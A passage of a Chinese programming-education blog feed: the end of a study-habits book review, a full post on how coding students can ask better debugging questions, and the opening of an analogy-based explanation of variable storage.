strategy」，懷抱著希望且相信自己做得到，這並不是一種計畫。</p><p>對那些職場人（作者在書中所使用的名詞，用來指稱那些目前有著正職工作的人）來說也是一樣的：</p><blockquote><p><em>職場人學習的時間明顯不足。可以不放棄某種程度的社交活動和休閒活動，又能兼顧學習，這種事在現實生活中不可能存在。在學習期間，必須放棄順序排在較後面的活動。舉例來說，如果想要守住學習的時間，對職場同事或親友的婚喪喜慶就必須設定出席的限度。</em></p></blockquote><blockquote><p><em>比較令人意外的是，職場人在學習期間，經常沒有依照先後順序行動的習慣。如果有誰覺得不必有所犧牲，「只要利用時間學習就行了」，這種想法無疑是邁向失敗的捷徑，甚至可能讓你的社交生活和學習雙雙落空。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.49</em></p></blockquote><p>要利用下班時間學習的話，勢必要做出取捨，什麼都想要的話，就只會什麼都得不到。</p><p>作者在書中也有給出自己設計的週末計畫，兼顧了學習跟休息，大概是：</p><ul><li>08:00 起床</li><li>09:00~12:00 學習</li><li>12:00~19:00 休息（約朋友吃飯、運動、購物等等）</li><li>19:00~22:00 學習</li><li>23:00 就寢</li></ul><p>雖然整個下午都是放鬆休息的狀態，但其實一天也學習了 6 個小時！若是下午有空檔的話，也許可以再多出一至兩個小時。</p><p>書中也有提到比起投入大量的時間學習，職場人更需要的是在有限時間內提高效率的練習，懂得有效利用時間才是學習的關鍵。我自己認為不只是職場人，其實全職學習的人也可以參考類似的方法，把平日也規劃成上面那樣的時程表，然後中午休息那一段可以再切割一下，擠出兩個小時，這樣一天就有八個小時的學習時間了。</p><p>除了時間管理以外，「空間管理」也是很重要的。<a href="https://www.ptt.cc/man/Physics/D105/M.1176545728.A.FA5.html">床是會高速移動的物體</a>，根據相對論，床具有極大的吸力，更何況家裡除了床還有電視跟其他誘惑。能在家裡認真學習的人，小弟我是真心佩服。</p><p>作者在書中也有對幾個不同的學習場地做出評論，例如說咖啡廳比較適合早上去，因為下午可能會變得有些吵雜，然後每天一杯咖啡的話其實也不便宜。圖書館的話很安靜而且不需要花錢，但有可能需要早一點去佔位子。</p><p>至於在家學習，作者有訂出幾個需要遵守的規範：</p><blockquote><p><em>1. 區隔學習的空間跟休息的空間<br>2. 在家盡可能不長時間學習<br>3. 為轉換心情及體能管理，一天至少短暫外出一次<br>4. 在排定好的時間外，絕對不開電腦或電視</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.94</em></p></blockquote><p>我自己的話在家裡也是很難專心學習，之前有時候需要遠端工作，我一定會去一些 co-working space，而且因為不會被其他人所干擾，甚至會覺得效率比我在辦公室時還要高。</p><p>所以除了時間以外，空間也是很重要的一項影響學習效率的因素。</p><h3 id="學習的心態調整"><a href="#學習的心態調整" class="headerlink" title="學習的心態調整"></a>學習的心態調整</h3><p>我之前已經有寫過幾篇文章在談這件事了，像是<a href="/2020/04/19/mindset-36c163303217/">打造「正確」學習 mindset</a>以及<a href="/2019/04/13/before-learning-b9b933b6078e/">學程式的第零課：心態調整</a>，在談的都是學習的心態。</p><p>有些人在學習開始之前，就會產生抗拒的心態，或者是不知道該怎麼選擇學習的目標，深怕「選錯」。而作者在書中則給了一個十分正面的心態：</p><blockquote><p><em>我想說的是，只要勇於嘗試就行的事情，不必花太多時間煩惱或看人臉色。不少人會這麼問：「我已經 OO 歲了，現在開始準備考試也沒問題嗎？」，有趣的是，不管是二十五歲、三十歲還是三十五歲，各年齡層的人都會問相同的問題。幼兒在挑戰拿當湯匙前，不會想著「我拿得起湯匙嗎？」「拿錯的話，會不會被媽媽笑？」的問題。如果心裡有那樣的顧慮，大概連湯匙也拿不好了。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.230</em></p></blockquote><blockquote><p><em>任何的選擇都無關失敗。如果你已經盡了最大的努力設定明確的目標，並且經過深思熟慮後，做出最適當的決定，那麼這個決定已經無關失敗。不是你的決定錯誤，只是你和目標無緣，不必再對此感到挫折。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.36</em></p></blockquote><p>在選擇學習的目標時，也必須從自身出發，去想一下自己到底想要學什麼，是為了自己而學，還是為了其他人而學？如果不是自己發自內心想學，動力或許就低一些。如果真的不知道學什麼但又想學習，選擇一個最多人在學的也是可以。</p><p>除了學習開始之前會碰到這種心態上的問題，學習中也會碰到撞牆期，如果沒有跨過那道牆的話，就到此為止了。在觀察學生心得的時候，也常常會看到他們提出各種疑問，例如說：</p><ul><li>我現在學的真的是我喜歡的嗎？</li><li>我真的想要寫程式嗎？</li><li>我真的有在進步嗎？</li><li>我真的想成為工程師嗎？</li><li>我真的有學進去嗎？</li></ul><p>這一部分可能是課程設計上的問題，沒有讓學生察覺到自己的進步，就失去了一些成就感，導致自我懷疑；但另一方面，若是能改變自己的心態去面對這些問題，或許也是一種方法：</p><blockquote><p><em>此外，學習的撞牆期也是必須克服的問題。無論學習什麼難免都會碰上實力提昇不上來的時期。這時一旦放棄，就將前功盡棄，與其如此，倒不如努力從頭到尾學習過一次。</em></p></blockquote><blockquote><p><em>如果前面的方法都不管用呢？最後的方法是用「先做再說」的態度學習。「為什麼要學習？」「學習真的能讓情況好轉嗎？」「學習真令人厭煩。」這些想法暫且拋到腦後吧！先下定決心把無法理解的部分背起來，堅持學習到能順利答題的程度為止吧！這個學習未來會得到什麼樣的結果，就留待日後檢驗。</em></p></blockquote><blockquote><p><em>雖然這種方法看起來很笨，不過我身邊取得不錯成就的人來看，也有不少人是用這種態度學習的。想法越單純，專注力越高。只要對學習產生一絲厭煩情緒，就會對學習造成阻礙。既然已經設定好目標，也下定決心要達到目標了，那麼默默堅持到最後才是最重要的。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.128</em></p></blockquote><p>分享一個小故事，我有時候會因為各種拖延症不想開始做事，就會去看 YouTube 廢片，看完之後滑 PTT，PTT 看完再去滑個臉書，然後一天就這樣過去了。在晚上睡覺前，就會覺得自己今天很廢，什麼事都沒做，都把時間浪費掉了。</p><p>為什麼會拖延？可能是因為覺得做起事來很廢，但其實不斷拖延不做事，比做事本身還要累，因為那是一種精神上的疲憊。你會一直不斷責備自己，但事情依然沒有被做好。這樣的話，還不如找個時間開始做事，你甚至會發現做事情本身要花的精力比想像中的少，比拖延還要輕鬆。</p><p>另一個作者有談到的是比較的心態，在我那個線上課程的計畫中，每個人都可以看到其他同學的進度跟作業，所以難免會產生比較心態，會覺得為什麼自己跟課跟得那麼慢，為什麼別人的作業都寫得那麼好。</p><blockquote><p><em>有時候看起來學習不比自己認真的朋友通過了考試，自己卻不合格。這種時候難免會喪失學習的動力，以為自己「果然不是讀書的料」。一旦喪失鬥志，將導致學習效果不佳，並再次得不到理想的結果，淪為惡性循環。</em></p></blockquote><blockquote><p><em>我們所看到的人，並不是他的全部。很多時候通過考試的朋友表面看起來比自己不認真，事實上卻不是如此。如果真有朋友完全不學習，卻運氣非常好地通過考試呢？就算如此，那也是他個人的問題，和我準備考試一點關係也沒有。因為那樣的朋友而消耗自己的情緒，對考試毫無幫助。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.163</em></p></blockquote><p>作者的態度十分務實，無論別人做了什麼，都跟你考試會不會通過，跟你學習的目標能不能達成無關，如果為了其他人而消耗自己的情緒，只會有負面影響，所以是不必要的。</p><p>在書的後半段也提到他有訓練過「切割情緒」，把心房想成有幾個不同的小房間，住著不同的情緒，當某一種情緒太過強烈時，就想辦法把房門關起來，不要去想它。</p><p>或是有一個小方法也很管用，就是出聲提醒自己應該做事了，例如說「阿！該背英文單字了」、「該去洗碗了」之類的，靠著做事情來分散注意力。</p><p>有一段話我覺得寫得很好：</p><blockquote><p><em>我過去在學習時，也經歷過低潮。職場人在學習時的每一刻，其實都是與深陷低潮的危機對抗的過程。當低潮的危機來臨時，請記住這個事實 — — 低潮既然是我造成的，我自然有能力克服；低潮隨時都可能出現，我也隨時可以戰勝它。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.236</em></p></blockquote><p>解鈴還須繫鈴人，自己把鈴鐺掛上去的，就自己拿下來吧。</p><h3 id="學習方法"><a href="#學習方法" class="headerlink" title="學習方法"></a>學習方法</h3><p>大家注意到了嗎？我前面寫了這麼多，卻還沒有提到學習的方法，這是因為前面那些事情如果都有做好，我覺得就已經先成功一半了。</p><p>在談學習方法之前，我們先回來談一下學習心態。有些人學習之所以不順，是因為最大的敵人就是自己，卻又沒辦法下定決心剷除自己，改變自己的觀念：</p><blockquote><p><em>每個職場人都有自己一套學習方法。但是在學習方面有過成功經驗的人，通常會堅持自己的學習方法。這可能是自尊心的問題，也可能是他們不願接受變化。</em></p></blockquote><blockquote><p><em>但是隨著時間改變，考試制度或出題方式不斷推陳出新，最有效的學習方式也並非全然適用於所有的情況。過去成功過一次的方法，可能不適合現在。我們必須時時檢視自己目前的學習方法，努力追求最新、最好的學習方法。如果考試結果不理想，也要客觀分析原因，才能避免再次失敗。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.236</em></p></blockquote><p>以前有用不代表現在有用，有些人就是很鐵齒，不換方法就是不換。現在的方法就算不管用，也不換，或許是期待某一天它會有用，也或許就是莫名的堅持。</p><p>這樣做的缺點在於，這是很消耗精力的一件事。當你的學習方法不管用，學習進度就會十分緩慢，看不太到自我的成長，一旦看不到成長，就會產生各種對自我以及對學習的懷疑，當這個懷疑大到一定程度的時候，就放棄了。</p><p>學習最困難的就是堅持到底。因為在這路上會有一堆心態上的問題需要處理，任何一個都有可能讓你萌生退意。</p><p>因此我對學習方法的看法跟作者一樣，必須時時檢視自己的學習方法是否適合自己以及現在正在學習的東西，若是試了一陣子沒有成效，就果斷放棄換一個，而不是堅持原本的。這也是我在<a href="/2020/02/10/learning-c6656ef14cd4/">用對你有效的學習方法，無論那是什麼</a>所談到的東西。</p><p>再來真的要談到學習方法了，有一個方法我印象深刻，因為我也不斷跟學生說可以試試看：</p><blockquote><p><em>放下想理解所有內容的執念</em></p></blockquote><blockquote><p><em>學習時犯下的最大錯誤，在於一字不漏地閱讀書本，執著於一次理解書本的內容。我們都以為熟讀書本，就能理解書中內容，並且留下長久的記憶。因此每次遇到不懂的地方，總是反覆推敲思考，直到完全理解之後，才願意進入下一個段落。然而用這種方式學習，一天能夠學習的份量只會逐漸減少。過於仔細閱讀新接觸的書本，不但導致速度降低，還會把自己搞得越來越累。再說就算完整讀過一遍，也不可能百分之百理解，所以我們必須調整學習時的心態，只要求理解核心內容就好。</em></p></blockquote><blockquote><p><em>我建議為每個段落設定時間限制，如果在預定時間內沒有讀完，就繼續往下一段。要是已經讀過兩次，腦中還是無法理解文字的意義，應該暫且跳過該段內容。一開始不必急著理解或背記太過瑣碎的內容。</em></p></blockquote><blockquote><p><em>許多人因為急著想立刻明白所有內容，也因為如果沒有完全理解就闔上書本，內心會感到不安，所以反覆閱讀無法理解的句子。但是為了消除這個不安的情緒而反覆閱讀，只會使進度嚴重落後，喪失學習動力。我們並不是為了解決心中的不安才學習的。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.99</em></p></blockquote><p>最後一段話講得真好，「我們並不是為了解決心中的不安才學習的」，學習有先後順序，其中最重要的就是學習目標，我們是為了達成學習的目標而學習的。</p><p>以我的課程為例，目標就是「轉職成工程師」，而不是「把所有東西學會」，有些學生常常會花很多額外的時間琢磨細節，這不是不好，只是悖離了原本的學習目標。很多東西之所以課程沒提到，就是因為我覺得那相對上來說不重要，只要把這週重要的內容學習完畢，就可以前往下一週了。</p><p>但依然有些人沒有辦法跨過自己心中的坎，就是沒有辦法跟「不安」共存，一定要把自己心中的疑惑解決了才願意繼續下去。但問題是一樣的，進度落後容易喪失學習動力，很有可能你的不安還沒解決，你就先放棄學習了（但若是真的沒有辦法跟不安共存，也是不用特別勉強，找到適合自己的方法最重要）。</p><blockquote><p><em>職場人準備考試，最好「隨便應付」。什麼？隨便應付？學習可以隨便應付嗎？這句話的意思，是指學習時不必理解所有考試內容。如果你下定決心要仔細理解考試內容，甚至讀完非常瑣碎的部分，那麼這個學習將難以堅持到終點。</em></p></blockquote><blockquote><p><em>通過考試比考試成績重要。即使不是考試，在學習其他事物時，也只要做到勉強達成個人目標的程度就好。有不了解的部分，只要知道問題所在就可以跳過。當職場人的學習出現壓力的那一刻起，學習便註定失敗。</em></p></blockquote><blockquote><p><em>— — 節錄並改寫自下班後 1 小時的極速學習 p.51</em></p></blockquote><p>之前有人問過我，看了這麼多期學生，最後能成功找到工作的那些人，有什麼特質？之前我可能會回答「能把課程跟完」，但現在我會回答：「能接受自己只明白課程教的內容就好。能夠跟不安共存，並且容忍自己的作業只是『OK』，而不是『很好』」。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>其實在看這本書的時候，我最敬佩的是作者對於學習的心態。從我節錄的那些段落中就可以看得出來，作者對於學習是保持一種非常正向的態度，但那種正向不是「強迫樂觀」的那種，而是經由理性分析之後得到的結果。</p><p>舉例來說，跟他人比較除了增進自己的情緒消耗以外毫無幫助，因此不需要跟他人比較；選擇既然都已經選了，就算真的選錯也無濟於事，因此選擇沒有對錯，只是跟選擇的目標無緣而已。</p><p>這種心態其實是很多人沒有的，有很多人依然是深怕選錯，深怕失敗。</p><p>另外，也可以從書中看出作者對於細節的用心程度。我一直都認為細節是專業跟非專業的關鍵，正是那些小細節產生了差異，讓一個人從前 1% 變成前 0.1%。</p><p>作者在書中有一段談到時間管理，在前一晚會先把自己隔天要穿的衣服準備好，要帶的東西也全部準備好，隔天起床只要盥洗過後差不多就可以出門了，省了一半的時間。</p><p>在通勤的時候也會分析各種狀況，例如說搭地鐵的時候可能適合看書，但公車不適合，因為公車太晃了；所以在搭公車時可以戴著耳機聽一些英文的資源，增進英文聽力，但走路的時候不適合，因為有可能聽不到周遭的環境音，會有一點危險；所以走路的時候可以想一下自己待會到公司要做些什麼，降低暖身的時間，一到公司就可以進入狀況開始辦公。</p><p>這些細節，有些人連想都沒想過，但是對作者來說只是日常生活的一部分。</p><p>我自己有時候也是會比較注意這種細節的人。例如說搭公車的時候，由於是常搭的路線，我知道哪些是熱門站，哪些是冷門站。如果要去的目的地剛好是冷門站，但是公車上人很多，我就會選擇在上一站的熱門站，跟著人潮一起下車，就不用在那邊一直「借過借過」。</p><p>也會根據自己在哪一站下車決定坐哪裡。需要在冷門站下車的話，就不適合坐後面的位子，因為很有可能你還沒下車，門就關了，你大喊司機也不一定聽得到。所以住家最理想的地方是離熱門站大概三四站的冷門站，去程一定有位子，回程不用怕人多下不了車。</p><p>我自己在看這本書的時候是邊讀邊點頭，「嗯，我也這樣想，講得真好」，就好像是有人把我的想法做了統整那樣子，然後就趕快把心中比較有感觸的段落節錄下來。</p><p>總之呢，我覺得這本書對於一些茫然的學習者應該會有些幫助，至少在心態的建立、學習方法的選擇以及學習的前置作業上，能夠得到一些建議跟幫助。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些可以問得更好的程式問題</title>
      <link href="/2020/07/22/ask-better-questions-19f01b02f436/"/>
      <url>/2020/07/22/ask-better-questions-19f01b02f436/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/ask-better-questions-19f01b02f436/0__Xwa6iaZsl2yUyzjw.jpg"></p><p>提問很難，尤其是對初學者來說。</p><p>所以我在教學的時候一直在想，除了<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way">提問的智慧</a>以外，有沒有什麼文章是可以讓學生看了之後，能夠更快速、更深刻地去體會為什麼他們問的問題不夠好？</p><p>舉例應該是最快的，而且不能是假想的例子，因為身為一個已經比較會提問的人，我想出來的例子跟真實的例子應該會差很遠。因此，我特別從學生那邊搜集了一些問題，這樣就可以直接來看這些被真實提出的問題，再來分析它們哪邊不夠好，哪邊可以再改進。</p><p>文章的問題皆為真實的提問，而我有把能夠識別出提問者身份的資訊去除，事前也有徵得本人同意。在看這些問題之前，我先講一下我整理出來的提問心法：一大原則，三大要素。</p><h3 id="問問題一大原則"><a href="#問問題一大原則" class="headerlink" title="問問題一大原則"></a>問問題一大原則</h3><p>這個原則就是：</p><blockquote><p>角色互換</p></blockquote><p>或是你要想成「設身處地」、「將心比心」之類的也可以。</p><p>當你把問題寫好要提出來的時候，你要想的第一件事情應該是：「如果我今天被其他人問一樣問題，我有<strong>足夠的資訊</strong>去 debug 嗎？」</p><p>很多人會以為問題的好壞取決於難易度，例如說這個問題只是少打一個字，所以是個壞問題；這問題很難 debug，所以是個好問題。不是的，問題的難易度取決於個人，儘管只是打錯字，但你就是卡了一個小時還解不出來，那就代表對你來說，這是一個困難的問題。</p><p>提問的好壞取決於資訊量，太少資訊量就是需要通靈人出場的時候，太多資訊量反倒變成一種雜訊，甚至是干擾。以初學者來說，<strong>寧可多給資訊，也不要少給。</strong></p><p>很多時候你的提問之所以資訊量太少，是因為這些資訊量存在於你的腦海中，而不是你的提問裡面，通常有可能 3 成在提問裡，7 成在你腦海。所以對他人而言，他只看到了你理解的 3 成，或甚至是更少。</p><p>在這種狀況下，其他人就只能靠經驗或者是通靈能力，才能理解你到底想問什麼。所以你必須要把你腦海中儲存的那些 context 一起放到問題裡面，其他人才知道這個問題完整的樣子到底是什麼。</p><p>這也是為什麼角色互換很重要，你要像開無痕視窗那樣，把你對這個問題的背景知識都拿掉，然後只看那個問題本身，去想一下如果有人這樣來問你，你有沒有辦法拿到你需要的資訊？如果沒有，通常就代表資訊量不足；如果有，但是你發現「你需要的資訊」其實存在你腦中，而不是你的提問，就代表你應該把這項資訊放到問題裡面。</p><p>不過這對初學者來說其實也不容易，因為有時候很難知道到底哪些是背景知識，哪些又是一定要放進問題裡的。</p><p>因此，我整理了底下的三大元素，可以先跟著做就是了。</p><h3 id="問問題三大要素"><a href="#問問題三大要素" class="headerlink" title="問問題三大要素"></a>問問題三大要素</h3><ol><li>問題描述</li><li>程式碼</li><li>截圖與文字</li></ol><p>第一點就是這問題想提問的點到底是什麼？你碰到的狀況到底是什麼？預期的狀況是什麼？</p><p>第二點就是程式碼，如果它是一個程式相關的問題，請把程式碼附上。</p><p>第三點就是附上截圖，把出現錯誤的畫面或是覺得有問題的地方截圖附上來。另外，程式碼也可以一起截圖，但這不代表就不需要「文字的程式碼了」，兩個都有的話其實會更好。</p><p>為什麼呢？因為要回答你問題的人，看到你問題時手邊不一定立刻就有電腦，所以沒辦法把你的程式碼跑起來確認結果。這時候如果有截圖，看程式碼就比較容易，也更有機會早一點幫你把 bug 找出來。</p><p>再者，這個要素是「截圖與文字」，意思是光有截圖是不夠的，你要把截圖中的重要訊息再用文字打一遍。為什麼？因為我可能會需要幫你把錯誤訊息拿去 Google，才知道這是什麼意思。如果你只有附截圖，那我就要自己再看著截圖打一遍——但通常沒有人會這麼勤勞。</p><p>截圖只是為了方便手邊沒有電腦的人解題，以及比較能確認整體的狀況為何，但裡面的重要資訊還是要再以文字來表示，才能完整表達問題。</p><p>知道以上三大要素以後，我們來看看各種真實世界的提問範例。</p><h3 id="範例一"><a href="#範例一" class="headerlink" title="範例一"></a>範例一</h3><blockquote><p>我想請問一下<br>你寫oddnumbersum 和 evennumbersum 的時候，都有先set sum ＝ 0，再一個一個加上去。<br>最後return sum但做完oddnumbersum 後，sum不是應該是32嗎？</p></blockquote><blockquote><p>那為什麼在做 evennumbersum 的時候，又要重新let sum ＝ 0？</p></blockquote><h4 id="問題描述"><a href="#問題描述" class="headerlink" title="問題描述"></a>問題描述</h4><p>勉強算是清楚，但最大的問題是缺乏 context，我知道他在講我曾經寫過的程式碼，但我不知道是哪一段，而且我也忘記原本的程式碼長怎樣了</p><h4 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h4><p>完全沒有附，導致我不知道怎麼回答他</p><h4 id="截圖與文字"><a href="#截圖與文字" class="headerlink" title="截圖與文字"></a>截圖與文字</h4><p>無</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>因為少了程式碼，所以我完全不知道該怎麼回答，因此我只能回：「你可能要附一下程式碼或是截圖喔」</p><p>附截圖是因為在 Slack 上程式碼可能比較不容易觀看，所以附截圖會更清楚。但截圖的缺點就是只適合比較短的程式碼，而且沒辦法複製，因此我覺得程式碼跟截圖一起附上是比較好的。</p><p>後來把截圖補上以後，我就有足夠資訊回答他的問題了。</p><h3 id="範例二"><a href="#範例二" class="headerlink" title="範例二"></a>範例二</h3><blockquote><p>卡關了QQ，為什麼我看不太懂我為什麼不能push?</p></blockquote><p><img src="/img/ask-better-questions-19f01b02f436/1__8ST3u__p4sXaCnnqAlV2rGQ.png"></p><h4 id="問題描述-1"><a href="#問題描述-1" class="headerlink" title="問題描述"></a>問題描述</h4><p>因為有搭配截圖，所以看得出來他想問什麼，但資訊還是不足</p><h4 id="程式碼-1"><a href="#程式碼-1" class="headerlink" title="程式碼"></a>程式碼</h4><p>這題不需要</p><h4 id="截圖與文字-1"><a href="#截圖與文字-1" class="headerlink" title="截圖與文字"></a>截圖與文字</h4><p>無</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>從截圖可以看出來，是在做 git push 的時候出錯，但除了截圖以外，應該要附上截圖中的重要資訊的文字版，所以應該要附上截圖中出現的 git repo 的網址，這樣我才能去 GitHub 看一下那個 repo 有沒有什麼異狀。</p><p>再者，也應該一併附上之前下其他指令的截圖，才有辦法 debug。</p><h4 id="範例三"><a href="#範例三" class="headerlink" title="範例三"></a>範例三</h4><blockquote><p>目前在寫 week3 作業，但依照 ESlint 給的回饋修改程式碼後，仍有兩個錯誤，都是同樣的：<code>error Parsing error: Unexpected token =</code> （如圖所示）</p></blockquote><blockquote><p>根據這個回傳的錯誤訊息，我找到 <a href="https://stackoverflow.com/questions/36001552/eslint-parsing-error-unexpected-token">stackoverflow 說是因為環境設置不同的關係</a></p></blockquote><blockquote><p>所以又找到<a href="https://lifesaver.codes/answer/standard-parsing-error-unexpected-token-=">這篇文章的解決方式</a>：修改 package.json，新增 standard，並在裡頭設置 parser: babel-eslint（如下）</p></blockquote><blockquote><p>“standard”: {<br> “parser”: “babel-eslint”<br> }</p></blockquote><blockquote><p>不過依然出現相同的 error 問題，也無法以 <code>/* eslint-disable */</code> 阻止噴出這個錯誤。<br>所以來詢問是否有建議的解決方式</p></blockquote><p><img src="/img/ask-better-questions-19f01b02f436/1__OWv0ptS2OvOo3KZ11FRbSg.png"></p><h4 id="問題描述-2"><a href="#問題描述-2" class="headerlink" title="問題描述"></a>問題描述</h4><p>描述的滿清楚的，而且有附上自己嘗試解決問題的過程。</p><h4 id="程式碼-2"><a href="#程式碼-2" class="headerlink" title="程式碼"></a>程式碼</h4><p>這題最大的重點在於從截圖中可以明確看出，這是 eslint 偵測到某一段程式碼不符合規則所以報錯，但因為沒有附上程式碼，所以無從 debug</p><h4 id="截圖與文字-2"><a href="#截圖與文字-2" class="headerlink" title="截圖與文字"></a>截圖與文字</h4><p>有截圖，但應該附上裡面的文字，也就是那個錯誤訊息的文字版</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>既然錯誤跟程式碼有關，那就一定要附上程式碼，不然缺少必要資訊，沒辦法判斷問題在哪。</p><p>於是我回說：「eslint 報錯一定是有原因的，錯誤訊息寫說是第10行那邊有出錯，但沒有看到程式碼沒辦法判斷原因，可以把程式碼 10 行左右那邊整個截圖貼上來，不然沒辦法判斷」</p><p>後來學生把程式碼貼上，就能看到錯誤在哪邊，修掉之後就沒問題了。</p><h4 id="範例四"><a href="#範例四" class="headerlink" title="範例四"></a>範例四</h4><blockquote><p>大家安安<br>前幾天我寫好了第三週的功課，也都已經得到 LIOJ 的 AC，今天打算來把他們都通過 Eslint 的測試然後交作業。<br>結果今天再次測試的時候發現結果都變得怪怪的… 我在想會不會是因為我前天寫完作業之後更新了 Windows 10 的 2004 Build，另外今天 Command Line 也變得有點奇怪，我之前都是使用 Sublime Text 3 搭配 Git Bash 編寫程式，有人有遇到一樣的問題嗎？</p></blockquote><h4 id="問題描述-3"><a href="#問題描述-3" class="headerlink" title="問題描述"></a>問題描述</h4><p>描述的滿不清楚，只有講「結果都變得怪怪的」，但卻沒有講說到底怎樣叫做怪怪的？是結果有出錯嗎？是出現奇怪的字元嗎？除非我會通靈，不然我不會知道。</p><h4 id="程式碼-3"><a href="#程式碼-3" class="headerlink" title="程式碼"></a>程式碼</h4><p>無</p><h4 id="截圖與文字-3"><a href="#截圖與文字-3" class="headerlink" title="截圖與文字"></a>截圖與文字</h4><p>無</p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>這題的資訊量不足，因為都只有講說「怪怪的」，卻沒有具體指出哪裡怪。應該附上的資訊為：</p><ol><li>之前是什麼樣子</li><li>現在是什麼樣子，差別在哪</li><li>預期中的結果是什麼</li><li>相關程式碼與截圖</li></ol><p>這一題後來有其他同學幫忙解答，在獲得以上資訊之後，順利解決問題。</p><h3 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h3><p>再複習一次三大要素：</p><ol><li>問題描述</li><li>程式碼</li><li>截圖與文字</li></ol><p>除非你真的很有自信某一個不需要，不然請全部都附上。問題的完整度直接決定了這個問題是否能夠被快速且有效率地解決，有時候錯誤的問題只會引來錯誤的回覆（尤其是回答的人經驗不太夠的時候，這個在社群裡面很常出現），而更糟的是因為你也不知道那個回覆是錯的，所以也一起被帶偏了。</p><p>不過我寫這篇文章不是叫大家停止問問題或是停止幫其他人解決問題啦，在一個學習氣氛良好的社群之下，是可以盡情發問跟解惑的，在 Lidemy 的社群裡面因為有我跟助教在，所以回答錯也沒關係，因為最後有人會跑出來給正確答案，點出錯誤在哪裡。</p><p>還有一點想特別提的，是有關於回答問題。那就是儘管問問題的人給了許多資訊，你必須去意識到一件事，那就是「提問者給的資訊有可能是錯的」。這很重要，因為有些人會想說既然是提問者自己給的，那就一定 100% 是正確的，但事實往往不然。</p><p>例如說可能會有這樣的提問：「我程式碼一開始都是好的，但是跑 eslint 把錯誤修正之後就壞了，可是邏輯我都沒動，只有加分號而已」，這時如果你完全相信他說的，就很有可能找不出問題在哪裡。</p><p>因為有可能真相是，在修錯誤的時候，也有把某個變數修掉，所以不只是加分號而已，其實還有其他變動。提問者沒有騙你，因為他自己也忘記，或是根本沒有發現這件事。</p><p>以這個觀點來看，我覺得回答問題可能可以分成幾個等級：</p><ol><li>Level1：根據提問者給的資訊回答，沒給的就回答不出來</li><li>Level2：承上，但可以透過通靈推敲出沒給的資訊大概是什麼</li><li>Level3：承上，而且可以分析出提問者給的某些資訊其實是錯的</li></ol><p>第三個 level 之所以難，是因為有可能他給的資訊是對的，而問題真正的根源是某個你想像不到的地方，所以你才會覺得他的說法不合理。</p><p>最後做個總結，其實無論是提問或是回答問題都是需要經驗的累積，看過的問題愈多，自然就能夠愈快從過去的經驗中尋找答案，畢竟很多常見的問題都是類似的。提問也是，在一開始學程式時背景知識嚴重不足，所以不知道該怎麼提問其實也滿合理的，但是當你會的東西愈來愈多，你就會漸漸知道某些資訊是重要的，在提問的時候就會一併奉上。</p><p>這篇如果之後有些案例會繼續更新，希望能整理得越來越完整。感謝 Lidemy，感謝助教以及學生們。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從博物館寄物櫃理解變數儲存模型</title>
      <link href="/2020/06/25/variable-and-frontdesk-a53a0440af3c/"/>
      <url>/2020/06/25/variable-and-frontdesk-a53a0440af3c/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/variable-and-frontdesk-a53a0440af3c/0__lSnFhHjWE7pLTNvt.jpg"></p><p>變數是絕大多數的人在學程式的時候，第一個或是第二個會碰到的東西。變數本身的概念不難，許多書上都拿「箱子」來比喻，就是個放東西的箱子而已。可是當後續講到什麼 call by reference 還是 call by value，或者是 C 語言的指標的時候，變數這東西的難度就突然成指數型增加。</p><p>而我認為之所會這樣子，就是因為沒有把「變數的儲存模型」建立起來的關係。所以這個模型至關重要，一旦有了這個模型的概念，在思考相關問題時只要能想到這個模型，問題就大概解開一半了。因此這一篇試著用比較淺顯易懂的角度，來講一下這個變數的儲存模型長什麼樣子。</p><p>核心概念是：</p><blockquote><p>我們應該要用什麼角度去理解變數，以及變數儲存的東西？</p></blockquote><p>先聲明一下，每種程式語言的儲存模型可能都不太一樣，而這篇也是經過簡化後的版本，實際上可能會複雜許多。但因為這篇的重點不在於「深入」，所以有許多東西都不會講到（例如說 stack frame、heap、constant pool，這些都不會提），只講我認為剛開始接觸程式時應該知道的東西，至少能把最基本的模型建立起來，日後再繼續擴張這個模型。</p><p>然後這篇的程式碼會以 JavaScript 為主。</p><h3 id="從博物館寄物櫃開始"><a href="#從博物館寄物櫃開始" class="headerlink" title="從博物館寄物櫃開始"></a>從博物館寄物櫃開始</h3><p>不知道大家有沒有去過一些有寄物櫃的地方？</p><p>我這邊講的不是健身房或是車站會看到的那種置物櫃，不是那種投幣以後讓你把東西放裡面，然後給你一個鑰匙的那種。那是自助式的置物櫃，我要談的不是那種。</p><p>我講的是有一個櫃檯，有幾個服務人員會站在那邊，你要把東西交給他們，他們會幫你放到身後的櫃子（或是隔壁的小房間），接著會把一個號碼牌給你，的那種寄物櫃。</p><p>突然想起來我在有些飯店也有看過類似的，不過我上一次看到是我<a 